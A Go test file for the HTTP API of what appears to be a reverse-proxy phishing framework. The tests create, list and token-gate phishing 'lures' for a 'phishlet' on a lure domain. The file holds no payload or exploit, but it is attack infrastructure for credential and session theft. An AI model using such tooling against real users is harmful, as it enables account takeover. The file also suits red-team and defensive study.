package core

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/spf13/viper"
)

func newApiTestServer(t *testing.T) (*apiServer, *Config) {
	t.Helper()
	c := &Config{
		cfg:            viper.New(),
		lures:          []*Lure{},
		lureIds:        []string{},
		phishlets:      map[string]*Phishlet{},
		phishletConfig: map[string]*PhishletConfig{},
		phishletNames:  []string{"edds"},
		general:        &GeneralConfig{Domain: "rubocking.work"},
	}
	c.phishlets["edds"] = &Phishlet{
		Name:       "edds",
		cfg:        c,
		proxyHosts: []ProxyHost{{phish_subdomain: "edds", domain: "rubocking.work", is_landing: true}},
	}
	c.phishletConfig["edds"] = &PhishletConfig{Hostname: "edds.rubocking.work", Visible: true}
	return &apiServer{cfg: c}, c
}

func doAPI(a *apiServer, method, target, body string) *httptest.ResponseRecorder {
	var reader *strings.Reader
	if body == "" {
		reader = strings.NewReader("")
	} else {
		reader = strings.NewReader(body)
	}
	req := httptest.NewRequest(method, target, reader)
	rec := httptest.NewRecorder()
	a.handleLures(rec, req)
	return rec
}

func TestCapabilitiesAdvertiseVersionAndFeatures(t *testing.T) {
	a, _ := newApiTestServer(t)
	rec := httptest.NewRecorder()
	a.handleCapabilities(rec, httptest.NewRequest("GET", "/capabilities", nil))

	if rec.Code != 200 {
		t.Fatalf("status: %d", rec.Code)
	}
	var payload struct {
		APIVersion string         `json:"api_version"`
		Features   []string       `json:"features"`
		Limits     map[string]int `json:"limits"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if payload.APIVersion != "1" {
		t.Fatalf("api_version: %q", payload.APIVersion)
	}
	if payload.Limits["phishlet_yaml_bytes"] != phishletYAMLMax {
		t.Fatalf("limits: %v", payload.Limits)
	}
	for _, want := range []string{"health", "phishlets.push", "sessions.completed", "lures.delete", "status.details"} {
		found := false
		for _, have := range payload.Features {
			if have == want {
				found = true
			}
		}
		if !found {
			t.Fatalf("feature missing: %s", want)
		}
	}
}

func TestStatusExposesPhishletHostnameAndCertBlock(t *testing.T) {
	a, _ := newApiTestServer(t)
	rec := httptest.NewRecorder()
	a.handleStatus(rec, httptest.NewRequest("GET", "/status", nil))

	if rec.Code != 200 {
		t.Fatalf("status: %d", rec.Code)
	}
	var payload map[string]interface{}
	if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if payload["status"] != "ok" || payload["api_version"] != "1" {
		t.Fatalf("unexpected payload: %v", payload)
	}
	hostnames := payload["hostnames"].(map[string]interface{})
	if hostnames["edds"] != "edds.edds.rubocking.work" {
		t.Fatalf("hostnames: %v", hostnames)
	}
	certs := payload["certs"].(map[string]interface{})
	if _, ok := certs["edds.edds.rubocking.work"]; !ok {
		t.Fatalf("cert entry missing: %v", certs)
	}
}

func TestCreateLureReturns201WithIdAndUrl(t *testing.T) {
	a, _ := newApiTestServer(t)
	rec := doAPI(a, "POST", "/lures", `{"phishlet":"edds","external_ref":"c:1"}`)

	if rec.Code != http.StatusCreated {
		t.Fatalf("status: %d body=%s", rec.Code, rec.Body.String())
	}
	var payload map[string]string
	if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if payload["id"] == "" || !strings.HasPrefix(payload["url"], "https://edds.edds.rubocking.work/") {
		t.Fatalf("unexpected payload: %v", payload)
	}
}

func TestCreateLureRejectsMissingHostnameAndDuplicateRef(t *testing.T) {
	a, c := newApiTestServer(t)
	c.phishlets["edds"].proxyHosts = nil

	rec := doAPI(a, "POST", "/lures", `{"phishlet":"edds"}`)
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("missing hostname status: %d", rec.Code)
	}
	c.phishlets["edds"].proxyHosts = []ProxyHost{{phish_subdomain: "edds", domain: "rubocking.work", is_landing: true}}

	first := doAPI(a, "POST", "/lures", `{"phishlet":"edds","external_ref":"dup"}`)
	if first.Code != http.StatusCreated {
		t.Fatalf("first create: %d", first.Code)
	}
	second := doAPI(a, "POST", "/lures", `{"phishlet":"edds","external_ref":"dup"}`)
	if second.Code != http.StatusConflict {
		t.Fatalf("duplicate ref status: %d", second.Code)
	}
	if !strings.Contains(second.Body.String(), "external_ref_taken") {
		t.Fatalf("duplicate ref body: %s", second.Body.String())
	}
}

func TestLureListFiltersAndIncludesUrl(t *testing.T) {
	a, _ := newApiTestServer(t)
	doAPI(a, "POST", "/lures", `{"phishlet":"edds","external_ref":"keep"}`)
	doAPI(a, "POST", "/lures", `{"phishlet":"edds","external_ref":"drop"}`)

	rec := doAPI(a, "GET", "/lures?external_ref=keep", "")
	if rec.Code != 200 {
		t.Fatalf("status: %d", rec.Code)
	}
	var rows []map[string]interface{}
	if err := json.Unmarshal(rec.Body.Bytes(), &rows); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(rows) != 1 || rows[0]["external_ref"] != "keep" {
		t.Fatalf("filter result: %v", rows)
	}
	if rows[0]["url"] == "" {
		t.Fatalf("url missing: %v", rows[0])
	}
}

func TestGatedLureUrlCarriesPlainToken(t *testing.T) {
	a, _ := newApiTestServer(t)
	rec := doAPI(a, "POST", "/lures", `{"phishlet":"edds","token":"auto"}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("status: %d body=%s", rec.Code, rec.Body.String())
	}
	var payload map[string]string
	if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if payload["token"] == "" {
		t.Fatal("token not generated")
	}
	if !strings.Contains(payload["url"], "t="+payload["token"]) {
		t.Fatalf("url misses token gate: %s", payload["url"])
	}
}

func TestWithLureTokenUsesCorrectSeparator(t *testing.T) {
	if got := WithLureToken("https://h/p", "abc"); got != "https://h/p?t=abc" {
		t.Fatalf("plain: %s", got)
	}
	if got := WithLureToken("https://h/p?x=1", "abc"); got != "https://h/p?x=1&t=abc" {
		t.Fatalf("existing query: %s", got)
	}
	if got := WithLureToken("https://h/p", ""); got != "https://h/p" {
		t.Fatalf("no token: %s", got)
	}
}
